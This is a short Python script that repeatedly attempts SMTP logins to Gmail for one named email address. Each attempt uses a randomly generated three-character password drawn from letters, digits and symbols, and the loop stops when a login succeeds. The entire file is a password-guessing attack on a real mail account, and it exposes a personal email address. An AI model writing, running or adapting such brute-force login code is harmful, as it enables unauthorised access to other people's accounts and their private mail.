import random
import smtplib
smaalphabet = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
caalphabet = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']
numbers = ['1','2','3','4','5','6','7','8','9','0']
othersin = ['~','`',"!",'#','$','%','^','&','*','(',')',"'",'"',"<",">",",",".","?","/","\\","-","+","_","=","@"]
def signin(email):
    server = smtplib.SMTP('smtp.gmail.com',587)
    server.ehlo()
    server.starttls()
    # print(guess, end="")
    try:
        server.login(email, yu)
        return True
    except Exception:
        return False
    
full = list(smaalphabet+caalphabet+numbers+othersin)
print(full)
yu = ""
while True:
    yu=""
    for i in range(3):
        guessl = full[random.randint(0,86)]
        yu = str(guessl)+str(yu)
    print(yu)
    # if yu=='abc':
    #     break
    aa = signin('subhashhodal808@gmail.com')
    if aa == True:
        break
